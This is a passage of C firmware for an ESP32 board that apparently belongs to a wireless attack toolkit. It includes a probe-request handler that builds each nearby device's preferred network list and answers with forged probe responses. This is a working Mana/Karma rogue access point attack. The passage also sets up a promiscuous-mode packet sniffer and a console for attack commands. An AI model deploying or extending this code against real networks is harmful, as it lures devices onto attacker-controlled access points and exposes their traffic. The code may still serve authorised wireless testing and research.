                    for (j=0; j < networkList[i].ssidCount && strcmp(ssid, networkList[i].ssids[j]); ++j) { }
                    if (j == networkList[i].ssidCount) {
                        /* SSID was not found in ssids, add it to the list */
                        char **newSsids = malloc(sizeof(char *) * (j + 1));
                        if (newSsids == NULL) {
                            ESP_LOGW(MANA_TAG, "Unable to add SSID \"%s\" to PNL for STA %s", ssid, strDestMac);
                        } else {
                            /* Copy existing SSIDs to newSsids */
                            for (int k=0; k < networkList[i].ssidCount; ++k) {
                                newSsids[k] = networkList[i].ssids[k];
                            }
                            /* Append the new SSID */
                            newSsids[j] = malloc(sizeof(char) * (strlen(ssid) + 1));
                            if (newSsids[j] == NULL) {
                                ESP_LOGW(MANA_TAG, "Failed to allocate bytes to hold SSID \"%s\" for STA %s", ssid, strDestMac);
                                free(newSsids);
                            } else {
                                strcpy(newSsids[j], ssid);
                                /* Only replace networkList[i].ssids with newSsids if we make it all this way */
                                /* Free networkList[i].ssids elements and array */
                                for (int k=0; k < networkList[i].ssidCount; ++k) {
                                    free(networkList[i].ssids[k]);
                                }
                                free(networkList[i].ssids);
                                networkList[i].ssids = newSsids;
                            }
                        }
                    }
                } else {
                    /* Add the station to networkList[] */
                    NetworkList *newList = malloc(sizeof(NetworkList) * (networkCount + 1));
                    int newCount = networkCount + 1;
                    if (newList == NULL) {
                        ESP_LOGW(MANA_TAG, "Unable to allocate memory to hold the Preferred Network List for STA %s. This will downgrade the Mana attack to a Karma attack.", strDestMac);
                    } else {
                        /* Copy across elements from networkList[] */
                        for (int j=0; j < networkCount; ++j) {
                            newList[j].ssidCount = networkList[j].ssidCount;
                            newList[j].ssids = networkList[j].ssids;
                            strcpy(newList[j].strMac, networkList[j].strMac);
                            memcpy(newList[j].bMac, networkList[j].bMac, 6);
                        }
                        /* Initialise a new NetworkList for this station */
                        strcpy(newList[networkCount].strMac, strDestMac);
                        memcpy(newList[networkCount].bMac, bDestMac, 6);
                        newList[networkCount].ssidCount = 1;
                        newList[networkCount].ssids = malloc(sizeof(char *));

                        if (newList[networkCount].ssids == NULL) {
                            ESP_LOGW(MANA_TAG, "Failed to allocate memory to hold SSID \"%s\" for STA %s. This SSID/STA pair will experience the Karma, not Mana, attack", ssid, strDestMac);
                        } else {
                            newList[networkCount].ssids[0] = malloc(sizeof(char) * (strlen(ssid) + 1));
                            if (newList[networkCount].ssids[0] == NULL) {
                                ESP_LOGW(MANA_TAG, "Failed to reserve bytes to hold SSID \"%s\" for STA %s. This SSID/STA tuple will get the Karma attack instead.", ssid, strDestMac);
                            } else {
                                strcpy(newList[networkCount].ssids[0], ssid);
                            }
                        }
                        /* Replace networkList[] with newList[] - Without leaking memory */
                        /* Loop through networkList[i].ssids and free each SSID before free'ing networkList itself*/
                        for (int j=0; j < networkCount; ++j) {
                            for (int k=0; k < networkList[j].ssidCount; ++k) {
                                free(networkList[j].ssids[k]);
                            }
                            free(networkList[j].ssids);
                        }
                        free(networkList);
                        networkList = newList;
                        networkCount = newCount;
                    }
                }

                /* Send probe response */
                send_probe_response(bCurrentMac, bDestMac, ssid, AUTH_TYPE_NONE);
            }
        }
        free(ssid);
    } 
    return;
}

int initialise_wifi() {
    /* Initialise WiFi if needed */
    if (!WIFI_INITIALISED) {
        esp_err_t ret = nvs_flash_init();
        if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
            ESP_ERROR_CHECK(nvs_flash_erase());
            ret = nvs_flash_init();
        }
        ESP_ERROR_CHECK(ret);

        ESP_ERROR_CHECK(esp_netif_init());
        ESP_ERROR_CHECK(esp_event_loop_create_default());
        esp_netif_create_default_wifi_ap();

        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

        ESP_ERROR_CHECK(esp_wifi_init(&cfg));
        ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

        /* Init dummy AP to specify a channel and get WiFi hardware into a
           mode where we can send the actual fake beacon frames. */
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
        wifi_config_t ap_config = {
            .ap = {
                .ssid = "ManagementAP",
                .ssid_len = 12,
                .password = "management",
                .channel = 1,
                .authmode = WIFI_AUTH_WPA2_PSK,
                .ssid_hidden = 0,
                .max_connection = 128,
                .beacon_interval = 5000
            }
        };

        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
        ESP_ERROR_CHECK(esp_wifi_start());
        ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

        // Set up promiscuous mode and packet callback
        wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous_rx_cb(wifi_pkt_rcvd);
        esp_wifi_set_promiscuous(true);
        WIFI_INITIALISED = true;
    }
    return ESP_OK;
}

static void initialize_filesystem(void)
{
    static wl_handle_t wl_handle;
    const esp_vfs_fat_mount_config_t mount_config = {
            .max_files = 4,
            .format_if_mount_failed = true
    };
    esp_err_t err = esp_vfs_fat_spiflash_mount_rw_wl(MOUNT_PATH, "storage", &mount_config, &wl_handle);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to mount FATFS (%s)", esp_err_to_name(err));
        return;
    }
}
#endif // CONFIG_STORE_HISTORY

static void initialize_nvs(void)
{
    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK( nvs_flash_erase() );
        err = nvs_flash_init();
    }
    ESP_ERROR_CHECK(err);
}

static int register_gravity_commands() {
    esp_err_t err;
    for (int i=0; i < CMD_COUNT; ++i) {
        err = esp_console_cmd_register(&commands[i]);
        switch (err) {
        case ESP_OK:
            ESP_LOGI(TAG, "Registered command \"%s\"...", commands[i].command);
            break;
        case ESP_ERR_NO_MEM:
            ESP_LOGE(TAG, "Out of memory registering command \"%s\"!", commands[i].command);
            return ESP_ERR_NO_MEM;
        case ESP_ERR_INVALID_ARG:
            ESP_LOGW(TAG, "Invalid arguments provided during registration of \"%s\". Skipping...", commands[i].command);
            continue;
        }
    }
    return ESP_OK;
}

void app_main(void)
{
    esp_console_repl_t *repl = NULL;
    esp_console_repl_config_t repl_config = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
    /* Prompt to be printed before each line.
     * This can be customized, made dynamic, etc.
     */
    repl_config.prompt = PROMPT_STR ">";
    repl_config.max_cmdline_length = CONFIG_CONSOLE_MAX_COMMAND_LINE_LENGTH;

    initialize_nvs();

#if CONFIG_CONSOLE_STORE_HISTORY
    initialize_filesystem();
    repl_config.history_save_path = HISTORY_PATH;
    ESP_LOGI(TAG, "Command history enabled");
#else
    ESP_LOGI(TAG, "Command history disabled");
#endif

    esp_log_level_set("wifi", ESP_LOG_ERROR); /* TODO: Consider reducing these to ESP_LOG_WARN */
    esp_log_level_set("esp_netif_lwip", ESP_LOG_ERROR);
    initialise_wifi();
    /* Register commands */
    esp_console_register_help_command();
    register_system();
    register_wifi();
    register_gravity_commands();
    /*register_nvs();*/

#if defined(CONFIG_ESP_CONSOLE_UART_DEFAULT) || defined(CONFIG_ESP_CONSOLE_UART_CUSTOM)
    esp_console_dev_uart_config_t hw_config = ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_uart(&hw_config, &repl_config, &repl));

#elif defined(CONFIG_ESP_CONSOLE_USB_CDC)
    esp_console_dev_usb_cdc_config_t hw_config = ESP_CONSOLE_DEV_CDC_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_usb_cdc(&hw_config, &repl_config, &repl));

#elif defined(CONFIG_ESP_CONSOLE_USB_SERIAL_JTAG)
    esp_console_dev_usb_serial_jtag_config_t hw_config = ESP_CONSOLE_DEV_USB_SERIAL_JTAG_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_usb_serial_jtag(&hw_config, &repl_config, &repl));

#else
#error Unsupported console type
#endif

    ESP_ERROR_CHECK(esp_console_start_repl(repl));
}

/* Convert the specified string to a byte array
   bMac must be a pointer to 6 bytes of allocated memory */
int mac_string_to_bytes(char *strMac, uint8_t *bMac) {
    int values[6];

    if (6 == sscanf(strMac, "%x:%x:%x:%x:%x:%x%*c", &values[0],
        &values[1], &values[2], &values[3], &values[4], &values[5])) {
        // Now convert to uint8_t
        for (int i = 0; i < 6; ++i) {
            bMac[i] = (uint8_t)values[i];
        }
    } else {
        ESP_LOGE(TAG, "Invalid MAC specified. Format: 12:34:56:78:90:AB");
        return ESP_ERR_INVALID_ARG;
    }
    return ESP_OK;
}

/* Convert the specified byte array to a string representing
   a MAC address. strMac must be a pointer initialised to
   contain at least 18 bytes (MAC + '\0') */
int mac_bytes_to_string(uint8_t *bMac, char *strMac) {
    sprintf(strMac, "%02X:%02X:%02X:%02X:%02X:%02X", bMac[0],
            bMac[1], bMac[2], bMac[3], bMac[4], bMac[5]);
    return ESP_OK;
}